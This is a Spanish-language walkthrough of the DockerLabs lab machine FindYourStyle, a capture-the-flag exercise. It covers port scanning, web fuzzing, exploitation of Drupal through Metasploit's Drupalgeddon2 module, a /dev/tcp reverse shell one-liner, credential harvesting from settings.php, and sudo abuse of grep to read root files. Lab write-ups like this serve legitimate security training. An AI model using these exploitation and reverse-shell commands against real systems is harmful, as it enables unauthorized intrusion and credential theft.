---
tags:
  - Cybersecurity
  - Labs
  - DockerLabs
  - Easy
  - Linux
  - HTTP
  - Drupal
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#HTTP|HTTP]]
	- [[#Explotación#Mestasploit|Mestasploit]]
	- [[#Explotación#Escalada de privilegios|Escalada de privilegios]]
	- [[#Explotación#Sudo|Sudo]]

---
# Resolviendo la máquina FindYourStyle

>En esta publicación, comparto cómo resolví la máquina **FindYourStyle** de [DockerLabs](https://dockerlabs.es/).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 172.17.0.2`

![[Pasted image 20250715184605.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts`

![[Pasted image 20250715184714.png]]

`nmap -p80 -sCV 172.17.0.2 -oN targeted`

![[Pasted image 20250715184743.png]]

![[Pasted image 20250715184854.png]]
### Fuzzing Web

`dirb http://172.17.0.2/`

![[Pasted image 20250715185738.png]]

---
## Explotación
### HTTP

`http://172.17.0.2/index.php/`

![[Pasted image 20250715185816.png]]
### Mestasploit

Se utiliza un módulo de *Metasploit* para explotar una vulnerabilidad crítica en **Drupal** conocida como *Drupalgeddon 2*.

`exploit/unix/webapp/drupal_drupalgeddon2`

```
search exploit/unix/webapp/drupal_drupalgeddon2
use 0 | use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS http://172.17.0.2/index.php/
exploit
```

![[Pasted image 20250715190038.png]]

![[Pasted image 20250715190055.png]]

`shell`

`/bin/bash -i`
 
Se establece una *reverse shell* para mantener el acceso persistente.

`nc -nlvp 4444`

`bash -c "sh -i >& /dev/tcp/192.168.1.127/4444 0>&1"`

![[Pasted image 20250715193635.png]]

Se realiza el tratamiento de la terminal.

```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![[Pasted image 20250715193729.png]]
### Escalada de privilegios

`cd var/www/html/sites/default`

`cat settings.php `

![[Pasted image 20250715191433.png]]

`su ballenita`

![[Pasted image 20250715192259.png]]
### Sudo

Se realiza una búsqueda de permisos **sudo**.

`sudo -l`

![[Pasted image 20250715193118.png]]

Se observa varios permisos sospechoso: */bin/ls* y */bin/grep*. 

Con */bin/ls* podemos listar directorios sin tener permisos y con */bin/grep* podemos leer archivos.

`sudo /bin/ls /root`

![[Pasted image 20250715193346.png]]

`sudo /bin/grep /root/secretitomaximo.txt`

![[Pasted image 20250715193413.png]]

`su root`

![[Pasted image 20250715193439.png]]

---